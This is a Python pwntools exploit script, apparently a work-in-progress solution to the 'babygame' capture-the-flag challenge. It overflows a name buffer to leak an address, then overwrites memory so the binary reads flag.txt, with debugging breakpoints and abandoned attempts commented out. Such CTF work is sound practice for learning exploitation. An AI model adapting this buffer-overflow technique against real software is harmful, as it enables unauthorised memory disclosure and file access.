#!/usr/bin/python3
from pwn import *
import os
import random
import time

elf = context.binary = ELF("babygame")
libc = elf.libc
context.log_level = "DEBUG"

# main  0x11c9
# 0x1425 cmp     [rbp+var_1C], eax
# 000000000000141C mov     [rbp+var_1C], eax
# break *0x555555555425
# break 00000000000011FE call    _read
# 000000000000120A mov     cs:RANDBUF, rax
# 0000000000001340 call    _printf
# break *0x5555555553DD
# break *0x55555555541C
# break *0x5555555551FE
# break *0x55555555520A
# break *0x55555555540D
# break *0x555555555331
# break *0x555555555340
# break *0x5555555552ed

#    0x00005555555553d8 <+43>:	call   0x5555555550b0 <fopen@plt>
# 0000000000001371 call    _strlen

gs = '''
break main
break *0x555555555425
break *0x5555555553d8
'''


# 862663782
# >>> 0x54435544
# 1413698884

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        # return remote('pwn-2021.duc.tf',31907)
        return process(elf.path)


print(elf.plt)
p=start()
p.sendlineafter('name?',b'A'*32  )
time.sleep(1)
p.sendline('2')
time.sleep(1)
p.recvuntil('A'*32)
time.sleep(1)
# leak=list(bytearray(p.recv(6)))
leak=u64(p.recv(6)+b'\x00\x00')
print('leak -> ',hex(leak))
# p.recvall()


time.sleep(1)
p.sendline('1') 
time.sleep(1)

exp=b''
#ESCRIBIR EN NAME Y EN RANDBUF
# exp=p64(0x5555555580a8)
exp=exp+b'flag.txt\x00'
# exp=exp+p64(0x336b3466)
# exp=exp+b'\x00'*(32-len(exp))+p64(0x5555555580a0)
exp=exp+b'\x00'*(16-len(exp))
# exp=exp+b'XXXXXXXX'
exp=exp+p64(0x336b3466) 
exp=exp+b'\x00'+b'\x22'*(31-len(exp))
# exp=exp+b'\x66\x34\x6b\x33'+b'\x00'*(32-len(exp))
exp=exp+p64(leak+8316)


time.sleep(1)
p.sendline(exp)

# p.sendafter('change your username to?\n',exp)
time.sleep(1)
# p.sendline('2')

# 0x336b3466

p.sendline('1')
p.sendline(b'T'*32+p64(0x555555559490))
# #cASI FUNCIONA
# p.send(b'X'*8)

# p.sendline('1')
# p.send(p64(0x555555559490))
# p.sendline('2')


# p.recvline()

print('lista leak -x ',[chr(x) for x in list(p.recvline())])


# heap flag 0x555555559490
# f4k3=862663782
# DUCT=1413698884

# leak=[ chr(x) for x in  list(p.recv())]
# print('leak -> ',leak)
p.interactive()

# p.recvall()
# p.sendline('2')
# p.recvuntil('A'*32)
# leak=list(bytearray(p.recv()))
# print('\n\nleak -> ',leak,'\n\n')
# while(True):
#     ran=random.randint(0xf0000000,0xffffffff)
#     p.sendline('1337')
#     p.sendlineafter('guess:',str(ran))
#     r=p.recvline()
#     print('r => ',r)
#     if(b'1. Set Username\n' not in r):
#         break
#     time.sleep(0.5)
# p.interactive()
